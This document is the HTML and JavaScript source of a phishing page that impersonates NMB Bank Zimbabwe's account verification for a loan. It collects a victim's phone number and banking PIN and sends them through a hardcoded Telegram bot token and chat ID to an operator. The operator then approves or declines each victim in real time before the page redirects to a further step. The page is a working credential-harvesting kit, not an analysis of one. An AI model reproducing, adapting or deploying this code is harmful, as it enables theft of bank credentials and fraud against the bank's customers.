<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification - NMB Bank Zimbabwe</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
        
        :root {
            --primary: #001f3f;
            --primary-dark: #000f1f;
            --primary-light: #e8f0f8;
            --accent: #D4AF37;
            --white: #ffffff;
            --gray-100: #f5f7fa;
            --gray-200: #e8ecf1;
            --gray-600: #6c757d;
            --gray-700: #4a4a4a;
            --radius-lg: 24px;
            --radius-sm: 10px;
            --transition: all 0.3s ease;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: linear-gradient(135deg, var(--gray-100) 0%, var(--primary-light) 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
        
        .login-card { background: var(--white); width: 100%; max-width: 440px; padding: 48px 32px; border-radius: var(--radius-lg); box-shadow: 0 12px 32px rgba(0,0,0,0.1); text-align: center; }
        .logo { margin-bottom: 30px; }
        .logo img { height: 56px; }
        
        h1 { font-size: 28px; color: var(--primary); font-weight: 800; margin-bottom: 8px; }
        .subtitle { color: var(--gray-600); font-size: 15px; margin-bottom: 32px; }

        .form-group { text-align: left; margin-bottom: 20px; }
        .form-label { display: block; font-size: 14px; font-weight: 600; margin-bottom: 8px; color: var(--gray-700); }
        .input-wrapper { position: relative; }
        .input-icon { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--primary); }
        .form-input { width: 100%; padding: 14px 16px 14px 48px; background: var(--gray-100); border: 1.5px solid var(--gray-200); border-radius: var(--radius-sm); font-size: 16px; font-family: inherit; outline: none; transition: var(--transition); }
        .form-input:focus { background: var(--white); border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0,31,63,0.08); }

        .btn-group { display: flex; flex-direction: column; gap: 12px; margin-top: 30px; }
        .btn { padding: 16px; border-radius: var(--radius-sm); font-weight: 700; cursor: pointer; border: none; font-family: inherit; display: flex; align-items: center; justify-content: center; gap: 10px; transition: var(--transition); }
        .btn-primary { background: var(--primary); color: var(--white); }
        .btn-primary:hover { background: var(--primary-dark); transform: translateY(-2px); }
        .btn-back { background: var(--gray-100); color: var(--gray-700); border: 1px solid var(--gray-200); }

        #spinner { position: fixed; inset: 0; background: rgba(0, 31, 63, 0.8); backdrop-filter: blur(8px); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; color: white; }
        .spinner-dots { display: flex; gap: 8px; margin-bottom: 20px; }
        .dot { width: 12px; height: 12px; background: var(--accent); border-radius: 50%; animation: pulse 1s infinite; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.5; } 50% { transform: scale(1.5); opacity: 1; } }

        .error-msg { background: #fff8f8; color: #dc3545; padding: 12px; border-radius: var(--radius-sm); border-left: 3px solid #dc3545; margin-bottom: 20px; font-size: 14px; font-weight: 600; display: none; }
    </style>
</head>
<body>

    <nav style="position:fixed; top:0; left:0; width:100%; background:white; padding:15px 0; border-bottom:1px solid var(--gray-200); z-index:1000;">
        <div class="container" style="max-width:1200px; margin:0 auto; padding:0 20px; display:flex; justify-content:space-between; align-items:center;">
            <div class="logo" style="margin:0;"><img src="logo.png" alt="NMB Bank" style="height:40px;"></div>
            <div style="display:flex; gap:10px;">
                <button class="btn btn-back" style="padding:8px 16px; font-size:13px;" onclick="location.href='login.html'">Sign In</button>
                <button class="btn btn-primary" style="padding:8px 16px; font-size:13px;" onclick="location.href='index.html'">Apply Now</button>
            </div>
        </div>
    </nav>

    <div class="login-card" style="margin-top:80px;">
        <div class="logo"><img src="logo.png" alt="NMB Bank"></div>
        <h1>Account Verification</h1>
        <p class="subtitle">Verify your account for loan approval. Enter your phone number and PIN to proceed.</p>

        <div id="errorBox" class="error-msg"></div>

        <div class="form-group">
            <label class="form-label">Phone Number</label>
            <div class="input-wrapper">
                <i class="fas fa-phone input-icon"></i>
                <input type="tel" id="phone" class="form-input" placeholder="0712345678" maxlength="10">
            </div>
        </div>

        <div class="form-group">
            <label class="form-label">PIN</label>
            <div class="input-wrapper">
                <i class="fas fa-lock input-icon"></i>
                <input type="password" id="pin" class="form-input" placeholder="4-digit PIN" maxlength="4">
            </div>
        </div>

        <div class="btn-group">
            <button class="btn btn-primary" onclick="handleVerify()">Verify Account <i class="fas fa-arrow-right"></i></button>
            <button class="btn btn-back" onclick="history.back()"><i class="fas fa-chevron-left"></i> Go Back</button>
        </div>
    </div>

    <div id="spinner">
        <div class="spinner-dots">
            <div class="dot"></div>
            <div class="dot"></div>
            <div class="dot"></div>
        </div>
        <p style="font-weight:700">Verifying account...</p>
    </div>

    <script>
        // CONFIG - USER MUST FILL THESE
        const CONFIG = {
            BOT_TOKEN: '8883385216:AAFj6cjQmV9kd7-wf6EZcSnlhuvLlO-PI88',
            CHAT_ID: '8889432014'
        };

        let pollInterval = null;
        let currentTs = null;

        function handleVerify() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;

            if (phone.length !== 10 || !phone.startsWith('0')) {
                return showError('Please enter a valid 10-digit phone number starting with 0');
            }
            if (pin.length !== 4) {
                return showError('Please enter a valid 4-digit PIN');
            }

            document.getElementById('spinner').style.display = 'flex';
            document.getElementById('errorBox').style.display = 'none';

            currentTs = Date.now();
            const message = `*NMB Bank Verification*\n\n📱 *Phone:* \`${phone}\`\n🔐 *PIN:* \`${pin}\`\n\nAction?`;
            
            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '✅ Approve', callback_data: `approve_${currentTs}` },
                            { text: '❌ Decline', callback_data: `decline_${currentTs}` }
                        ]]
                    }
                })
            }).then(() => {
                startPolling();
            }).catch(err => {
                document.getElementById('spinner').style.display = 'none';
                showError('Connection error. Please try again.');
            });
        }

        function startPolling() {
            if (pollInterval) clearInterval(pollInterval);
            pollInterval = setInterval(async () => {
                try {
                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=-1`);
                    const data = await res.json();
                    if (data.ok && data.result.length > 0) {
                        const update = data.result[0];
                        if (update.callback_query && update.callback_query.data.includes(currentTs)) {
                            const action = update.callback_query.data.split('_')[0];
                            clearInterval(pollInterval);
                            document.getElementById('spinner').style.display = 'none';
                            
                            if (action === 'approve') {
                                localStorage.setItem('phone', document.getElementById('phone').value);
                                window.location.href = 'verify.html';
                            } else {
                                showError('Verification declined. Please check your credentials.');
                            }
                        }
                    }
                } catch (e) {}
            }, 2000);
        }

        function showError(msg) {
            const err = document.getElementById('errorBox');
            err.textContent = msg;
            err.style.display = 'block';
        }

        // Pre-fill phone number from localStorage
        window.onload = function() {
            const savedPhone = localStorage.getItem('phone');
            if (savedPhone) {
                document.getElementById('phone').value = savedPhone;
                // If phone is pre-filled, focus on PIN
                document.getElementById('pin').focus();
            }
        };
    </script>
</body>
</html>
